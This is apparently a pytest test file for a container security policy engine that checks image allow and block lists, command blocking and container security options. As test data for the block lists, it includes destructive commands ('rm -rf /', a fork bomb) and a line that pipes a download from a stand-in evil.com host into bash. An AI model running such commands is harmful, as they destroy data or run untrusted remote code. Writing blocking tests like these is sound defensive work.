"""Tests for security policy engine."""

import pytest

from orcaops.schemas import (
    CommandPolicy,
    ImagePolicy,
    JobCommand,
    JobSpec,
    PolicyResult,
    SandboxSpec,
    SecurityPolicy,
    WorkspaceSettings,
)
from orcaops.policy_engine import PolicyEngine


def _job_spec(image="python:3.11", commands=None):
    cmds = commands or ["echo hello"]
    return JobSpec(
        job_id="test-job",
        sandbox=SandboxSpec(image=image),
        commands=[JobCommand(command=c) for c in cmds],
    )


class TestImageValidation:
    def test_default_allows_all(self):
        engine = PolicyEngine()
        result = engine.validate_image("anything:latest")
        assert result.allowed is True

    def test_allowed_list_match(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(allowed_images=["python:*", "node:*"]),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_image("python:3.11").allowed is True
        assert engine.validate_image("node:20").allowed is True
        assert engine.validate_image("ruby:3.2").allowed is False

    def test_blocked_list(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(blocked_images=["*:latest"]),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_image("python:latest").allowed is False
        assert engine.validate_image("python:3.11").allowed is True

    def test_blocked_takes_priority(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(
                allowed_images=["python:*"],
                blocked_images=["python:latest"],
            ),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_image("python:latest").allowed is False
        assert engine.validate_image("python:3.11").allowed is True

    def test_require_digest(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(require_digest=True),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_image("python:3.11").allowed is False
        assert engine.validate_image(
            "python@sha256:abc123def456"
        ).allowed is True

    def test_workspace_settings_merge(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(allowed_images=["python:*"]),
        )
        ws_settings = WorkspaceSettings(
            allowed_images=["node:*"],
            blocked_images=["node:latest"],
        )
        engine = PolicyEngine(policy, workspace_settings=ws_settings)
        assert engine.validate_image("python:3.11").allowed is True
        assert engine.validate_image("node:20").allowed is True
        assert engine.validate_image("node:latest").allowed is False
        assert engine.validate_image("ruby:3.2").allowed is False


class TestCommandValidation:
    def test_default_allows_all(self):
        engine = PolicyEngine()
        assert engine.validate_command("rm -rf /tmp/stuff").allowed is True

    def test_blocked_exact(self):
        policy = SecurityPolicy(
            command_policy=CommandPolicy(
                blocked_commands=["rm -rf /", ":(){:|:&};:"],
            ),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_command("rm -rf /").allowed is False
        assert engine.validate_command(":(){:|:&};:").allowed is False
        assert engine.validate_command("rm -rf /tmp/stuff").allowed is True

    def test_blocked_pattern_substring(self):
        policy = SecurityPolicy(
            command_policy=CommandPolicy(
                blocked_patterns=[r"curl.*\|\s*bash"],
            ),
        )
        engine = PolicyEngine(policy)
        result = engine.validate_command("curl http://evil.com | bash")
        assert result.allowed is False

    def test_blocked_regex_patterns(self):
        policy = SecurityPolicy(
            command_policy=CommandPolicy(
                blocked_patterns=[r".*--privileged.*", r".*--net=host.*"],
            ),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_command("docker run --privileged alpine").allowed is False
        assert engine.validate_command("docker run --net=host alpine").allowed is False
        assert engine.validate_command("docker run alpine").allowed is True

    def test_invalid_regex_ignored(self):
        policy = SecurityPolicy(
            command_policy=CommandPolicy(blocked_patterns=["[invalid"]),
        )
        engine = PolicyEngine(policy)
        assert engine.validate_command("anything").allowed is True


class TestJobValidation:
    def test_valid_job(self):
        engine = PolicyEngine()
        result = engine.validate_job(_job_spec())
        assert result.allowed is True

    def test_blocked_image_fails_job(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(blocked_images=["python:*"]),
        )
        engine = PolicyEngine(policy)
        result = engine.validate_job(_job_spec(image="python:3.11"))
        assert result.allowed is False
        assert any("blocked" in v for v in result.violations)

    def test_blocked_command_fails_job(self):
        policy = SecurityPolicy(
            command_policy=CommandPolicy(blocked_commands=["rm -rf /"]),
        )
        engine = PolicyEngine(policy)
        result = engine.validate_job(_job_spec(commands=["echo ok", "rm -rf /"]))
        assert result.allowed is False

    def test_multiple_violations(self):
        policy = SecurityPolicy(
            image_policy=ImagePolicy(blocked_images=["python:*"]),
            command_policy=CommandPolicy(blocked_commands=["rm -rf /"]),
        )
        engine = PolicyEngine(policy)
        result = engine.validate_job(
            _job_spec(image="python:3.11", commands=["rm -rf /"])
        )
        assert result.allowed is False
        assert len(result.violations) >= 2


class TestContainerSecurityOpts:
    def test_default_security_opts(self):
        engine = PolicyEngine()
        opts = engine.get_container_security_opts()
        assert opts["cap_drop"] == ["ALL"]
        assert "no-new-privileges:true" in opts["security_opt"]
        assert opts["read_only"] is False

    def test_custom_security_opts(self):
        policy = SecurityPolicy(
            container_security={
                "cap_drop": ["NET_RAW"],
                "security_opt": [],
                "read_only": True,
            },
        )
        engine = PolicyEngine(policy)
        opts = engine.get_container_security_opts()
        assert opts["cap_drop"] == ["NET_RAW"]
        assert opts["read_only"] is True
